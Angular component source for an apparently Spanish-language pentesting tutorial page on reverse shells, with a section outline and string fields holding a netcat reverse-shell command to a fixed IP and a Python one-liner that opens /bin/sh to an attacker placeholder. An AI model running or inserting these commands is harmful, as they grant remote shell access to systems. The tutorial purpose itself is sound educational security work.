import { Component, AfterViewInit, OnInit } from '@angular/core';
import { Title } from '@angular/platform-browser';
import { Location } from '@angular/common';
import Prism from 'prismjs';
import { Router, NavigationEnd } from '@angular/router';
interface Section {
  label: string;
  subSections?: Section[];
}
@Component({
  selector: 'app-rever-shell',
  templateUrl: './rever-shell.component.html',
  styleUrl: './rever-shell.component.css'
})
export class ReverShellComponent {
  constructor(private titleService: Title, private router: Router, private location: Location) {
    this.router.events.subscribe((event) => {
      if (event instanceof NavigationEnd) {
        window.scrollTo(0, 0); // Scrolls to the top of the page
      }
    });
  }
  sections: Section[] = [
    { label: 'Que es una rever',
    subSections: [
      { label: 'Como conseguir una rever',
      subSections: [
        { label: 'Rever basica con Netcat' },
        { label: 'Preparacion para la rever' },
      ],
       },
       { label: 'One-Liner',
       subSections: [
        { label: 'Python' },
        { label: 'Bash' },
        { label: 'PHP' },
      ]},
      { label: 'Scripts',
       subSections: [
        { label: 'Python' },
        { label: 'PHP' },
      ]},
      { label: 'Msfvenom',
       subSections: [
        { label: 'Python' },
        { label: 'PHP' },
      ]}
    ]
     }
  ];
  pageTitle: string = '';
  nc:  string = `nc -e /bin/bash 192.168.1.134 4444`;
  which:  string = `which python`;
  pythonRever: string="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<IP ATACANTE>\",<PUERTO>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
  phpServer: string = `php -S localhost:8000`;
  codigo:  string = 'codigo';
  comando:  string = 'comando';
  ngOnInit(): void {
    this.pageTitle = 'Ataques a contraseñas online';
    this.titleService.setTitle(this.pageTitle);
  }
  copyContent(param: any) {
    const codeContainer = document.querySelector(param) as HTMLElement;
    console.log(codeContainer);
    if (codeContainer) {
      const range = document.createRange();
      range.selectNode(codeContainer);
      window.getSelection()?.removeAllRanges();
      window.getSelection()?.addRange(range);
      document.execCommand('copy'); // Copia el texto seleccionado al portapapeles
      window.getSelection()?.removeAllRanges();
    }
  }
  generateURL(label: string): string {
    const basePath = this.location.prepareExternalUrl('');
    return `${basePath}revershell#${label}`;
  }

}
